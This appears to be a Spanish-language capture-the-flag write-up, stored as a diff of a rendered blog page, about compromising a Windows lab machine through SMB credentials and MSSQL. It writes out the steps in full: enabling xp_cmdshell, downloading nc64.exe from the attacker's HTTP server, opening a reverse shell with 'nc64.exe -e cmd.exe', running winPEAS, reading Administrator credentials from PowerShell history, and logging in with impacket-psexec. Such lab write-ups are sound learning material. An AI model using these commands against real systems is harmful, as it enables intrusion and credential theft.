@@ -1,0 +1,61 @@
+I"�<hr />
+
+<p><br /></p>
+
+<h2 id="primera-máquina-que-me-bloquea">PRIMERA MÁQUINA QUE ME BLOQUEA</h2>
+
+<h3 id="primera-flag-flag-sencilla">PRIMERA FLAG (FLAG SENCILLA)</h3>
+<p>Este post hace referencia a mi primera atascada. Esta máquina tenía una vulnerabilidad de smb y sql.
+La primera de smb nos daba las credenciales de un usuario normal, tan solo era acceder y descargar
+ese archivo.
+Luego, debo conectarme a la base de datos, gracias a una herramienta de impacket, <strong>mssqlclient</strong></p>
+
+<p>Accedo con la siguiente linea <code class="language-plaintext highlighter-rouge">impacket-mssqlclient -windows-auth {USER}:{PASSWORD}@{IP}</code></p>
+
+<p>Necesito habilitar un procedimiento que spawnea un cmd. Usamos <code class="language-plaintext highlighter-rouge">enable_xp_cmdshell</code></p>
+
+<p>Ahora si hacemos <code class="language-plaintext highlighter-rouge">xp_cmdshell whoami</code> nos ejecutará el comando.</p>
+
+<p>En este punto llegó mi atasco porque no sabia como seguir.</p>
+
+<p>Debo conseguir la flag del usuario normal. Ya la conseguí buscando por los directorios
+pero hay una manera mas sencilla. Uso <strong>nc</strong> para conectarme remotamente.
+En mi máquina empiezo un servidor HTTP simple en una terminal y me pongo en escucha con netcat.
+Para empezar el servidor HTTP: <code class="language-plaintext highlighter-rouge">sudo python3 -m http.server 80</code>
+Para ponerme en escucha con nc: <code class="language-plaintext highlighter-rouge">sudo nc -lvnp 443</code></p>
+
+<p>Con nuestro usuario no tenemos permisos para subir ficheros. Por eso usamos el servidor HTTP, 
+para que se lo descargue en su carpeta de Descargas. 
+Lo hago de la siguiente manera: <code class="language-plaintext highlighter-rouge">xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://{MI_IP}/nc64.exe -outfile nc64.exe"</code></p>
+
+<p>Verifico en la terminal de nuestro servidor de python HTTP que se ha hecho la petición.</p>
+
+<p>Ahora me conecto a nc: <code class="language-plaintext highlighter-rouge">xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe 
+-e cmd.exe {MI_IP} 443</code></p>
+
+<p>En la terminal donde estaba en escucha tenemos la reverse shell.</p>
+
+<p><br /></p>
+
+<h3 id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h3>
+<p>Esta es la parte dificil de la maquina.</p>
+
+<p>Creo el .bat <strong>winPEAS</strong>. Este script analiza una posible ruta para escalar privilegios.</p>
+
+<p>Con la shell reverse de antes, transferimos el .bat: <code class="language-plaintext highlighter-rouge">wget http://{MI_IP}/winPEAS.bat -outfile winPEAS.bat</code>
+y lo ejecutamos. Entramos en <strong>powershell</strong> y .\winPEAS.bat</p>
+
+<p>Es dificil ver algo, pruebo con winPEAS.exe escrito en C.</p>
+
+<p>Transferimos el winPEAS.exe como hice con el .bat y lo ejecuto.</p>
+
+<p>Nos dice el scan que puede haber credenciales en la siguiente direccion: 
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</p>
+
+<p>Navegamos hasta ella y esta las credenciales de Administrator.</p>
+
+<p>Con otra herramienta de impacket <strong>psexec</strong> entramos como administrador.
+impacket-psexec administrator@{IP}
+En el escritorio tenemos la flag de administrador.</p>
+:ET
